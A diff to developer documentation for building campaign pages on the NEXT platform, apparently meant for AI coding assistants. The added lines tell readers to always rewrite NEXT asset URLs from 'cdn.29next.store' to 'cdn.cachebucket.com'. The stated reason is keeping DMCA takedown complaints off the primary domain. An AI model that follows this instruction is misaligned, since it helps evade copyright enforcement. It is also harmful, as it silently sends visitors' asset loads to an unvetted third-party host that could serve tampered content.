@@ -344,6 +344,8 @@ Resolves to the campaign-relative path. Use for all local assets.
 <img src="{{ 'images/logo.png' | campaign_asset }}" alt="Logo">
 ```
 
+**Remote NEXT-hosted assets (not `campaign_asset`):** files uploaded to the NEXT platform are served from two interchangeable hosts, `cdn.29next.store` and `cdn.cachebucket.com` (same path on both). On campaign pages always use **`https://cdn.cachebucket.com/...`** — campaigns are frequent DMCA-takedown targets by competitors, and the alternative host keeps those complaints off the primary domain. If you are given a `cdn.29next.store` URL, swap only the host.
+
 ### `campaign_link`
 Generates a clean URL for inter-page navigation. Strips `.html`, adds trailing slash, prepends slug.
 
@@ -1317,3 +1319,4 @@ If `window.nextDebug` is undefined, debug mode is not enabled — add the meta t
 8. **SDK version is set in campaigns.json**, not in `base.html` directly. To upgrade, update `sdk_version` in the campaign's entry.
 9. **`next_url`, `next_url`, `decline_url` are filenames** (e.g. `upsell.html`) — `base.html` applies `campaign_link` to them. Do not pre-format these values in frontmatter.
 10. **Inside `<template>` elements, use single-brace tokens** (`{item.name}`), not Liquid (`{{ item.name }}`).
+11. **Reference NEXT-hosted assets via `cdn.cachebucket.com`, never `cdn.29next.store`.** Both hosts serve the same paths; the alternative host keeps DMCA-takedown complaints aimed at campaigns off the primary domain.
